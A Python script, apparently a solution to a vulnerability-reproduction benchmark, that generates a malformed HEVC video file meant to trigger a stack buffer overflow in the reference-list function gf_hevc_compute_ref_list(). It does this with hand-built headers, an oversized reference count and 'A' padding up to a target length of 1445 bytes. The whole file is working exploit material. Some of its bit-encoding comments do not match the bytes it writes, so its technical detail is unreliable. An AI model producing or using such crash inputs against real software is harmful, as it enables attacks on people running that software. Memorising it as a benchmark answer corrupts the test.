import os
import struct
import subprocess
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This PoC targets the stack buffer overflow in gf_hevc_compute_ref_list()
        # The vulnerability lacks sufficient length checks for reference lists
        
        # Create a minimal HEVC video that will trigger the vulnerable function
        # We need to create a malformed HEVC bitstream that causes an overflow
        # in the reference list computation
        
        # Structure of the PoC:
        # 1. Minimal HEVC headers to get to the vulnerable function
        # 2. Malformed slice header with large reference list counts
        # 3. Overflow payload
        
        poc = bytearray()
        
        # Start code prefix
        def add_start_code():
            poc.extend(b'\x00\x00\x00\x01')
        
        # Add VPS (Video Parameter Set)
        add_start_code()
        # NAL unit type: VPS (32)
        # Simplified VPS for minimal HEVC
        vps = bytearray([0x40, 0x01, 0x0c, 0x01, 0xff, 0xff, 0x01, 0x60, 
                         0x00, 0x00, 0x03, 0x00, 0x80, 0x00, 0x00, 0x03,
                         0x00, 0x00, 0x03, 0x00, 0x78, 0x9d, 0xc0, 0x90])
        poc.extend(vps)
        
        # Add SPS (Sequence Parameter Set)
        add_start_code()
        # NAL unit type: SPS (33)
        # Minimal SPS
        sps = bytearray([0x42, 0x01, 0x01, 0x01, 0x60, 0x00, 0x00, 0x03,
                         0x00, 0x80, 0x00, 0x00, 0x03, 0x00, 0x00, 0x03,
                         0x00, 0x78, 0xa0, 0x03, 0xc0, 0x80, 0x10, 0xe4,
                         0x8d, 0x8e, 0x43, 0x24, 0x0f, 0x16, 0x87, 0xcb,
                         0xf0, 0xa1, 0xd1, 0x68, 0x40])
        poc.extend(sps)
        
        # Add PPS (Picture Parameter Set)
        add_start_code()
        # NAL unit type: PPS (34)
        # PPS with invalid reference list parameters
        pps = bytearray([0x44, 0x01, 0xc0, 0xf3, 0xc0, 0x02, 0x40])
        poc.extend(pps)
        
        # Now add a slice that will trigger the overflow
        # The key is to create a slice with manipulated reference list counts
        add_start_code()
        
        # Slice NAL unit (type 1 = non-IDR slice)
        # We need to set up the slice to call gf_hevc_compute_ref_list()
        slice_header = bytearray([0x26])  # NAL unit header
        
        # First slice segment flag
        slice_header.append(0x80)  # first_slice_segment_in_pic_flag = 1
        
        # Slice type: P-slice (0) encoded as ue(v) = 1
        slice_header.append(0x40)  # slice_type = 0 (P-slice)
        slice_header.append(0x00)
        
        # pic_parameter_set_id = 0 (ue(v) = 1)
        slice_header.append(0x20)
        
        # This is where we trigger the overflow
        # Set num_ref_idx_l0_active_minus1 to a very large value
        # This will cause the vulnerable function to overflow its buffer
        
        # num_ref_idx_active_override_flag = 1
        slice_header.append(0x80)
        
        # num_ref_idx_l0_active_minus1 = large value (0xFF) encoded as ue(v)
        # ue(v) encoding for 255: 
        # M = floor(log2(255+1)) = 7
        # code_num = 255+1-2^7 = 128
        # Binary representation: 0000000 1 10000000 (15 bits)
        slice_header.append(0x01)  # 7 zeros + 1
        slice_header.append(0x00)  # remaining 8 bits
        slice_header.append(0x00)  # padding
        
        # Add malformed reference picture list
        # The function expects num_ref_idx_l0_active_minus1+1 entries
        # With our large value, this will overflow the stack buffer
        
        # Add a large number of reference picture list entries
        # Each entry is a ue(v) encoded reference index
        for i in range(255):
            # Use ue(v) encoding for small values to save space
            slice_header.append(0x80)  # ue(0) = 1
            
        # Pad with more data to ensure we hit the overflow
        # The ground truth length is 1445, so we need to reach that
        
        # Calculate current length
        current_len = len(poc) + len(slice_header)
        remaining = 1445 - current_len
        
        if remaining > 0:
            # Add padding to reach target length
            # Use pattern that's likely to trigger crash (non-zero)
            padding = bytes([0x41] * remaining)  # 'A' pattern
            slice_header.extend(padding)
        
        poc.extend(slice_header)
        
        # Ensure exact length
        if len(poc) < 1445:
            poc.extend(b'A' * (1445 - len(poc)))
        elif len(poc) > 1445:
            poc = poc[:1445]
        
        return bytes(poc)
